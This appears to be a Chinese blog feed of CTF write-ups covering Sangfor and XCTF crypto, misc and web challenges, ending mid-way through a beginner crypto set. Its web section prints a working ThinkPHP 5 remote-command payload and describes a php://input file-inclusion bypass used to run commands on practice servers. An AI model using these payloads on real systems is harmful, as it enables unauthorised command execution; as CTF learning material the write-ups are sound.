    <content type="html"><![CDATA[<h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="基础题签到"><a class="markdownIt-Anchor" href="#基础题签到"></a> 基础题–签到</h2><h3 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h3><p>  U2FuZ2ZvcntXZUxjME1lX1QwX1Nhbmdmb3JfQ1RGfQ==<br />  提交格式为：sangfor{xxxxxxx}</p><h3 id="解答"><a class="markdownIt-Anchor" href="#解答"></a> 解答</h3><p>  Base64解码得到答案：<code>Sangfor&#123;WeLc0Me_T0_Sangfor_CTF&#125;</code>，注意根据提示，第一个S要换成小写字母。</p><h2 id="简单的凯撒base64"><a class="markdownIt-Anchor" href="#简单的凯撒base64"></a> 简单的凯撒+base64</h2><h3 id="题目-2"><a class="markdownIt-Anchor" href="#题目-2"></a> 题目</h3><p>  d2Vya2pzdntteEBfbXdfeml2OV9pQHdjfQ==<br />  位移：4<br />  Flag提交格式：sangfor{xxxxxxx}</p><h3 id="解答-2"><a class="markdownIt-Anchor" href="#解答-2"></a> 解答</h3><p>  先Base64解码，得到：<code>werkjsv&#123;mx@_mw_ziv9_i@wc&#125;</code>。<br />  再根据提示，用位移为4的凯撒密码解码，得到答案：<code>sangfor&#123;it@_is_ver9_e@sy&#125;</code>。</p><h2 id="有趣的密文"><a class="markdownIt-Anchor" href="#有趣的密文"></a> 有趣的密文</h2><h3 id="题目-3"><a class="markdownIt-Anchor" href="#题目-3"></a> 题目</h3><p>  小啊giao在书上看见了一段密文： asfngrof{gla@esin@y}b<br />  然后密文旁边的注释凌乱的写着：2153476<br />  聪明的你能否帮助小啊giao破解出密文获得flag吗？</p><h3 id="解答-3"><a class="markdownIt-Anchor" href="#解答-3"></a> 解答</h3><p>  当时我是手动置换的，这里有在线网站:<br /><a href="https://ctftools.com/down/down/passwd/">https://ctftools.com/down/down/passwd/</a></p><p>  使用其中的置换密码功能，输入排列和密文得到答案：<code>sangfor&#123;flage@is@ynb&#125;</code>。</p><h2 id="affine"><a class="markdownIt-Anchor" href="#affine"></a> Affine</h2><h3 id="题目-4"><a class="markdownIt-Anchor" href="#题目-4"></a> 题目</h3><p>  y=25x-6 密文：cuhopgdwht<br />  Flag提交格式：sangfor{xxxxxxxx}</p><h3 id="解答-4"><a class="markdownIt-Anchor" href="#解答-4"></a> 解答</h3><p>  使用Affine解码脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;cuhopgdwht&#x27;</span></span><br><span class="line">s1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">len</span> = <span class="built_in">len</span>(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>):</span><br><span class="line">    //系数根据图标对应得到，后面反向加减</span><br><span class="line">    a = (<span class="number">25</span> * (<span class="built_in">ord</span>(s[i]) - <span class="number">97</span> + <span class="number">6</span>)) % <span class="number">26</span></span><br><span class="line">    s1 += <span class="built_in">chr</span>(a + <span class="number">97</span>)</span><br><span class="line">print(s1)</span><br></pre></td></tr></table></figure><p>  其中计算部分系数使用下图，本题函数系数25，采用25的逆元，还是25。</p><p><img src="https://pic.lufer.cc/images/2021/08/13/imagea466b9588dea63a3.png" alt="" /></p><p>  答案：<code>sangfor&#123;sangforynb&#125;</code></p><h2 id="base64的亲戚"><a class="markdownIt-Anchor" href="#base64的亲戚"></a> Base64的亲戚</h2><h3 id="题目-5"><a class="markdownIt-Anchor" href="#题目-5"></a> 题目</h3><p>  :A:?TqXusB?aW}%pD8j{So[tJ.l@?nRcBr/4P}<sup>dt?ok)wO_?;:{]I-&lt;KYj-q#d96v2;]=UF/GPV+k%mF%$5^h+#s(YoiJX)MEE5eQ7MW9m$kDM/LzPupv2vJai]B#R}8TFo[xc)syWXB4?0-</sup>taieX6E=vyo/+X8Y=1sX2$.}O}&lt;wIlE_k/Bg3:J0y!U}woK7:</p><h3 id="解答-5"><a class="markdownIt-Anchor" href="#解答-5"></a> 解答</h3><p>  用Basecrack解密：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&gt;] Enter Encoded Base::A:?TqXusB?aW&#125;%pD8j&#123;So[tJ.l@?nRcBr&#x2F;4P&#125;^dt?ok)wO_?;:&#123;]I-&lt;KYj-q#d96v2;]&#x3D;UF&#x2F;GPV+k%mF%$5^h+#s(YoiJX)MEE5eQ7MW9m$kDM&#x2F;LzPupv2vJai]B#R&#125;8TFo[xc)syWXB4?0-^taieX6E&#x3D;vyo&#x2F;+X8Y&#x3D;1sX2$.&#125;O&#125;&lt;wIlE_k&#x2F;Bg3:J0y!U&#125;woK7:</span><br><span class="line"></span><br><span class="line">[&gt;] Decoding as Base92: E:)d)8NH*6f!^afecoIG&quot;hESQP]y,aiY^tm0Z0&lt;SB8*@@7ee#ww2;yrj)$RbB8oa[fx2k23N;Og!S9&#123;c!&#x2F;Jz)wiC7OVz,+7d&#96;7;dul1j@#F)1l~cL5nJ]!&#x2F;BrI4fFw_b#i@Jj9L[&quot;OAe2N&amp;eviWHb7#zJO~(uC</span><br><span class="line"></span><br><span class="line">[-] The Encoding Scheme Is Base92</span><br></pre></td></tr></table></figure><p>  得到用Base92解密之后的字符串，再次解密：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&gt;] Enter Encoded Base: E:)d)8NH*6f!^afecoIG&quot;hESQP]y,aiY^tm0Z0&lt;SB8*@@7ee#ww2;yrj)$RbB8oa[fx2k23N;Og!S9&#123;c!&#x2F;Jz)wiC7OVz,+7d&#96;7;dul1j@#F)1l~cL5nJ]!&#x2F;BrI4fFw_b#i@Jj9L[&quot;OAe2N&amp;eviWHb7#zJO~(uC</span><br><span class="line"></span><br><span class="line">[&gt;] Decoding as Base91: RzRaVE1NSldJVTNET05SV0daRERPTVJYSUkyREVOQlFHNFpUSU5KVklZMkRTTlpUR1ZERElPSldJVTNUSU5SVkc0WkRNTkpYR00zVElOUlpHWkNUTU5aWElRPT09PT09</span><br><span class="line"></span><br><span class="line">[-] The Encoding Scheme Is Base91</span><br></pre></td></tr></table></figure><p>  得到用Base91解密之后的字符串，再次解密。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&gt;] Enter Encoded Base: RzRaVE1NSldJVTNET05SV0daRERPTVJYSUkyREVOQlFHNFpUSU5KVklZMkRTTlpUR1ZERElPSldJVTNUSU5SVkc0WkRNTkpYR00zVElOUlpHWkNUTU5aWElRPT09PT09</span><br><span class="line"></span><br><span class="line">[&gt;] Decoding as Base64: G4ZTMMJWIU3DONRWGZDDOMRXII2DENBQG4ZTINJVIY2DSNZTGVDDIOJWIU3TINRVG4ZDMNJXGM3TINRZGZCTMNZXIQ&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">[-] The Encoding Scheme Is Base64</span><br></pre></td></tr></table></figure><p>  得到用Base64解密之后的字符串，再次解密：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&gt;] Enter Encoded Base: G4ZTMMJWIU3DONRWGZDDOMRXII2DENBQG4ZTINJVIY2DSNZTGVDDIOJWIU3TINRVG4ZDMNJXGM3TINRZGZCTMNZXIQ&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">[&gt;] Decoding as Base32: 73616E67666F727B424073455F49735F496E746572657374696E677D</span><br><span class="line"></span><br><span class="line">[-] The Encoding Scheme Is Base32</span><br></pre></td></tr></table></figure><p>  得到用Base32解密的字符串，再次解密：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&gt;] Enter Encoded Base: m73616E67666F727B424073455F49735F496E746572657374696E677D</span><br><span class="line"></span><br><span class="line">[&gt;] Decoding as Base16: sangfor&#123;B@sE_Is_Interesting&#125;</span><br><span class="line"></span><br><span class="line">[-] The Encoding Scheme Is Base16</span><br></pre></td></tr></table></figure><p>  得到用Base16解密的字符串，即为答案。</p><h2 id="twotree"><a class="markdownIt-Anchor" href="#twotree"></a> twoTree</h2><h3 id="题目-6"><a class="markdownIt-Anchor" href="#题目-6"></a> 题目</h3><p>  Hint: Front？ middle？ back？Which is correct? I think it’s behind.<br />  Flag提交格式:sangfor{xxxxxxx}</p><h3 id="解答-6"><a class="markdownIt-Anchor" href="#解答-6"></a> 解答</h3><p>  题目附件是一张打不开图片，根据提示可能图的前中后有信息，用Winhex打开，发现图片首位全部是十六进制数，复制出来并转为文本得到两个字符串：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f09e54c1bad2x38mvyg7wzlsuhkijnop</span><br><span class="line">905e4c1fax328mdyvg7wbsuhklijznop</span><br></pre></td></tr></table></figure><p>  根据提示和两个字符串的构造，应该是二叉树的前序遍历和中序遍历，后序遍历即为答案。<br />借助python实现脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">last_sort</span>(<span class="params">str1, str2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(str2) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> str2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> last_sort(str1[<span class="number">1</span>:str2.index(str1[<span class="number">0</span>]) + <span class="number">1</span>], str2[:str2.index(str1[<span class="number">0</span>])]) + last_sort(</span><br><span class="line">            str1[str2.index(str1[<span class="number">0</span>]) + <span class="number">1</span>:],</span><br><span class="line">            str2[str2.index(str1[<span class="number">0</span>]) + <span class="number">1</span>:</span><br><span class="line">            ]) + str1[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str1 = [<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">str2 = [<span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">print(last_sort(str1, str2))</span><br></pre></td></tr></table></figure><p>  得到后序遍历为<code>951c4e03xm82yw7gvdakhusjilponzbf</code>。</p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="web1"><a class="markdownIt-Anchor" href="#web1"></a> web1</h2><h3 id="题目-7"><a class="markdownIt-Anchor" href="#题目-7"></a> 题目</h3><p>  key会在哪里呢？</p><p><a href="http://sangforctfweb2.free.idcfengye.com/web1.html">http://sangforctfweb2.free.idcfengye.com/web1.html</a></p><h3 id="解答-7"><a class="markdownIt-Anchor" href="#解答-7"></a> 解答</h3><p>  访问目标网址，F12看网页源码，得到答案：<code>sangfor&#123;flag_admiaanaaaaaaaaaaa&#125;</code>。</p><h1 id="杂项"><a class="markdownIt-Anchor" href="#杂项"></a> 杂项</h1><h2 id="签到"><a class="markdownIt-Anchor" href="#签到"></a> 签到</h2><h3 id="题目-8"><a class="markdownIt-Anchor" href="#题目-8"></a> 题目</h3><p>  这题很简单，…/-<br />  Flag提交格式:sangfor{xxxxx}</p><h3 id="解答-8"><a class="markdownIt-Anchor" href="#解答-8"></a> 解答</h3><p>  附件是莫斯密码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...&#x2F;.-&#x2F;-.&#x2F;--.&#x2F;..-.&#x2F;---&#x2F;.-.&#x2F;----.--&#x2F;.--&#x2F;...--&#x2F;.-..&#x2F;-.-.&#x2F;-----&#x2F;--&#x2F;.&#x2F;..--.-&#x2F;-&#x2F;-----&#x2F;..--.-&#x2F;-.-.&#x2F;.-.&#x2F;-.--&#x2F;.--.&#x2F;-&#x2F;-----&#x2F;-----.-</span><br></pre></td></tr></table></figure><p>  解密获得答案：<code>sangfor&#123;w3lc0met0crypt0&#125;</code>。</p><h2 id="漂亮小姐姐"><a class="markdownIt-Anchor" href="#漂亮小姐姐"></a> 漂亮小姐姐</h2><h3 id="题目-9"><a class="markdownIt-Anchor" href="#题目-9"></a> 题目</h3><p>  漂亮小姐姐说了要学会百度来解密，解密的钥匙：sangfor<br />  Flag提交格式:sangfor{xxxxxxxx}</p><h3 id="解答-9"><a class="markdownIt-Anchor" href="#解答-9"></a> 解答</h3><p>  根据提示，百度搜索图片解密，找到网站http://www.jsons.cn/imghideinfo/</p><p>  上传图片并填入密码<code>sangfor</code>，得到答案<code>sangfor&#123;You_@re_So_Clever&#125;</code>。</p><h2 id="fake-encryption"><a class="markdownIt-Anchor" href="#fake-encryption"></a> fake encryption</h2><h3 id="题目-10"><a class="markdownIt-Anchor" href="#题目-10"></a> 题目</h3><p>  提交格式为：sangfor{xxxxxxx}<br />  hint: 总有马大哈会把登陆密码泄露出去</p><h3 id="解答-10"><a class="markdownIt-Anchor" href="#解答-10"></a> 解答</h3><p>  根据提示，在附件的抓包里面寻找password，找到记录之后追踪TCP流。</p><p><img src="https://pic.lufer.cc/images/2021/08/17/image.png" alt="" /></p><p>  用找到的Password作为密码解压附件中的压缩包，得到答案<code>sangfor&#123;hiahiahiahiathisistheflag&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pwn&quot;&gt;&lt;/a&gt; PWN&lt;/h1&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#crypto&quot;&gt;&lt;/a&gt; Crypto&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界MISC高手进阶题</title>
    <link href="https://coder.lufer.cc/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E9%A2%98/"/>
    <id>https://coder.lufer.cc/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E9%A2%98/</id>
    <published>2021-08-12T09:07:52.000Z</published>
    <updated>2021-12-17T03:59:35.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="reverseme"><a class="markdownIt-Anchor" href="#reverseme"></a> reverseMe</h1><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： XCTF 3rd-GCTF-2017<br />  题目描述：暂无<br />  题目场景： 暂无</p><h2 id="解答"><a class="markdownIt-Anchor" href="#解答"></a> 解答</h2><p>  把附件图镜像之后得到答案。</p><p><img src="https://pic.lufer.cc/images/2021/08/12/imagea71a2155963c06c2.png" alt="" /></p><h1 id="base644"><a class="markdownIt-Anchor" href="#base644"></a> base64÷4</h1><h2 id="题目-2"><a class="markdownIt-Anchor" href="#题目-2"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： 暂无<br />  题目描述：暂无</p><h2 id="解密"><a class="markdownIt-Anchor" href="#解密"></a> 解密</h2><p>  看题目以为是先*4或者/4之后进行base64解密，发现怎么都不对，后来考虑十六进制直接转字符串，得到答案：`</p><h1 id="embarrass"><a class="markdownIt-Anchor" href="#embarrass"></a> embarrass</h1><h2 id="题目-3"><a class="markdownIt-Anchor" href="#题目-3"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： ciscn-2017<br />  题目描述：暂无</p><h2 id="解答-2"><a class="markdownIt-Anchor" href="#解答-2"></a> 解答</h2><p>  给了一个pcapng，用wireshark打开搜了半天flag也没找到什么内容。<br />  百度了一下，发现直接检索flag就可以，确实很embarrass。</p><p><img src="https://pic.lufer.cc/images/2021/08/12/image7c4fd1595a4f268b.png" alt="" /></p><h1 id="神奇的modbus"><a class="markdownIt-Anchor" href="#神奇的modbus"></a> 神奇的Modbus</h1><h2 id="题目-4"><a class="markdownIt-Anchor" href="#题目-4"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： XCTF 4th-SCTF-2018<br />  题目描述：寻找flag,提交格式为sctf{xxx}</p><h2 id="解答-3"><a class="markdownIt-Anchor" href="#解答-3"></a> 解答</h2><p>  附件是一个抓包文件，根据题目提示，关注modbus类型的协议，随便找一条追踪tcp流，发现答案。</p><p><img src="https://pic.lufer.cc/images/2021/08/12/image02b1e98d656e284f.png" alt="" /></p><p>  但是Easy_Mdbus过不了，要提交Easy_Modbus才可以。</p><h1 id="something_in_image"><a class="markdownIt-Anchor" href="#something_in_image"></a> something_in_image</h1><h2 id="题目-5"><a class="markdownIt-Anchor" href="#题目-5"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： 2019湖湘杯<br />  题目描述：暂无</p><h2 id="解答-4"><a class="markdownIt-Anchor" href="#解答-4"></a> 解答</h2><p>  我搁这解压缩半天，找到了一个congratulations2文件夹，激动半天发现往下走不动了，百度一下发现人家strings一下就搜出来了。</p><p><img src="https://pic.lufer.cc/images/2021/08/12/image00a34d642dbcd955.png" alt="" /></p><h1 id="wireshark-1"><a class="markdownIt-Anchor" href="#wireshark-1"></a> wireshark-1</h1><h2 id="题目-6"><a class="markdownIt-Anchor" href="#题目-6"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： 广西首届网络安全选拔赛<br />  题目描述：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)。 flag提交形式为flag{XXXX}</p><h2 id="解答-5"><a class="markdownIt-Anchor" href="#解答-5"></a> 解答</h2><p>  打开流量包，检索login，找到用户登录的password。</p><p><img src="https://pic.lufer.cc/images/2021/08/12/image307b4085e0e9e0e3.png" alt="" /></p><h1 id="pure_color"><a class="markdownIt-Anchor" href="#pure_color"></a> pure_color</h1><h2 id="题目-7"><a class="markdownIt-Anchor" href="#题目-7"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： school-ctf-winter-2015<br />  题目描述：格式为flag{xxxxxx}</p><h2 id="解答-6"><a class="markdownIt-Anchor" href="#解答-6"></a> 解答</h2><p>  用StegSolve打开附件，切换通道，得到flag:<code>true_steganographers_doesnt_need_any_tools</code>。</p><p><a href="https://pic.lufer.cc/image/dqBK"><img src="https://pic.lufer.cc/images/2021/08/13/image.md.png" alt="" /></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;reverseme&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#reverseme&quot;&gt;&lt;/a&gt; reverseMe&lt;/h1&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#题目&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/tags/CTF/"/>
    
    <category term="MISC" scheme="https://coder.lufer.cc/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Web高手进阶题</title>
    <link href="https://coder.lufer.cc/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E9%A2%98/"/>
    <id>https://coder.lufer.cc/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E9%A2%98/</id>
    <published>2021-08-12T08:14:08.000Z</published>
    <updated>2021-12-17T03:59:35.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="baby_web64"><a class="markdownIt-Anchor" href="#baby_web64"></a> baby_web64</h1><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： 暂无<br />  题目描述：想想初始页面是哪个</p><h2 id="解答"><a class="markdownIt-Anchor" href="#解答"></a> 解答</h2><p>  根据提示，直接访问index.php，发现被重定向回1.php，F12看请求，找到答案。</p><p><a href="https://pic.lufer.cc/image/dcwo"><img src="https://pic.lufer.cc/images/2021/08/12/image81e277c1fdc7463e.md.png" alt="" /></a></p><h1 id="training-www-robots"><a class="markdownIt-Anchor" href="#training-www-robots"></a> Training-WWW-Robots</h1><h2 id="题目-2"><a class="markdownIt-Anchor" href="#题目-2"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： 暂无<br />  题目描述：暂无</p><h2 id="解答-2"><a class="markdownIt-Anchor" href="#解答-2"></a> 解答</h2><p>  访问robots.php,得到网站目录。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;fl0g.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: Yandex</span><br><span class="line">Disallow: *</span><br></pre></td></tr></table></figure><p>  访问fl0g.php，得到答案<code>cyberpeace&#123;67670cc4fa7382a7a38f780508caa43b&#125;</code>。</p><h1 id="php_rce"><a class="markdownIt-Anchor" href="#php_rce"></a> php_rce</h1><h2 id="题目-3"><a class="markdownIt-Anchor" href="#题目-3"></a> 题目</h2><p>  难度系数： 2.0<br />  题目来源： 暂无<br />  题目描述：暂无</p><h2 id="解答-3"><a class="markdownIt-Anchor" href="#解答-3"></a> 解答</h2><p>  根据题目描述，应该是远程代码执行漏洞，实验环境提示是ThinkPHPV5，百度搜索该版本的远程执行漏洞，得到代码如下：<br /><code>/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></p><p>  通过ls命令查看目录文件，发现没有，开始往上层找，最终再三层之后找到了flag文件：</p><p><code>/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20../../../</code></p><blockquote><p>bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var var</p></blockquote><p>  cat一下flag文件得到答案：</p><p><code>/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag</code></p><blockquote><p>flag{thinkphp5_rce} flag{thinkphp5_rce}</p></blockquote><h1 id="web_php_include"><a class="markdownIt-Anchor" href="#web_php_include"></a> Web_php_include</h1><h2 id="题目-4"><a class="markdownIt-Anchor" href="#题目-4"></a> 题目</h2><p>  难度系数： 2.0<br />  题目来源： XTCTF<br />  题目描述：暂无</p><h2 id="解答-4"><a class="markdownIt-Anchor" href="#解答-4"></a> 解答</h2><p>  根据题目描述，应该是PHP的文件包含漏洞。<br />  PHP的文件包含漏洞是指对于PHP中4个函数<code>include</code>、<code>include_once</code>、<code>require</code>、<code>require_once</code>，当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。<br />  观察题目环境，注意到是include了page页面，所以可以在对page的访问中构造攻击命令。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>  然后PHP的文件包含漏洞攻击有两个常用命令：</p><ol><li>php://input<br />  这个协议的利用方法是 将要执行的语法php代码写在post中提交，不用键与值的形式，只写代码即可。</li><li>php://filter<br />  设计用来过滤筛选文件，通过filter非php语法文件导致include失败，直接输出源码内容。</li></ol><p>  先采用input方法执行ls指令来查看目录下都有什么文件。<br />  由于代码中对php进行了替换，借助str_replace对大小写敏感来绕过替换。</p><p><img src="https://pic.lufer.cc/images/2021/08/12/image4c3fad9ca61d3e16.png" alt="" /></p><p>  发现目录下有疑似flag的文件，cat一下内容。</p><p><img src="https://pic.lufer.cc/images/2021/08/12/imaged1b72a13a09c1fcf.png" alt="" /></p><p>  得到答案<code>ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;baby_web64&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#baby_web64&quot;&gt;&lt;/a&gt; baby_web64&lt;/h1&gt;
&lt;h2 id=&quot;题目&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#题目&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://coder.lufer.cc/tags/CTF/"/>
    
    <category term="Web" scheme="https://coder.lufer.cc/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界CRYPTO新手练习题</title>
    <link href="https://coder.lufer.cc/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCRYPTO%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
    <id>https://coder.lufer.cc/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCRYPTO%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E9%A2%98/</id>
    <published>2021-08-11T01:24:43.000Z</published>
    <updated>2021-12-17T03:59:35.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="base64"><a class="markdownIt-Anchor" href="#base64"></a> base64</h1><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： poxlove3<br />  题目描述：元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。</p><h2 id="解答"><a class="markdownIt-Anchor" href="#解答"></a> 解答</h2><p>  根据题目提示用base64解密附件得到答案<code>cyberpeace&#123;Welcome_to_new_World!&#125;</code>。</p><h1 id="caesar47"><a class="markdownIt-Anchor" href="#caesar47"></a> Caesar47</h1><h2 id="题目-2"><a class="markdownIt-Anchor" href="#题目-2"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： poxlove3<br />  题目描述：你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 